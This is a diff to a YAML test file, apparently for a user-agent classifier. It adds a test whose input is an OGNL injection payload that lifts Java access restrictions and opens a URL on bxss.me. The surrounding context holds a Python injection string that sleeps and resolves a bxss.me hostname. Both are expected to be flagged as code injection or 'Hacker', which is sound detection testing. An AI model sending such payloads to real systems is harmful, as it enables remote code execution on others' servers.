@@ -850,6 +850,11 @@ config:
 
 - test:
     input:
+      user_agent_string: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36''),request,#_memberAccess[''allowPrivateAccess'']=true,#_memberAccess[''allowProtectedAccess'']=true,#_memberAccess[''allowPackageProtectedAccess'']=true,#_memberAccess[''allowStaticMethodAccess'']=true,#_memberAccess[''excludedPackageNamePatterns'']=#_memberAccess[''acceptProperties''],#_memberAccess[''excludedClasses'']=#_memberAccess[''acceptProperties''],new java.net.URL(''http''+''://hitxhqviceavj.bxss.me/'').openStream().close(),new java.lang.String('''
+    expected: *isCodeInjection
+
+- test:
+    input:
       user_agent_string: '''+str(__import__("time").sleep(9))+__import__("socket").gethostbyname("xxxxx."+"bxss.me")+'''
     expected:
       DeviceClass                          : 'Hacker'
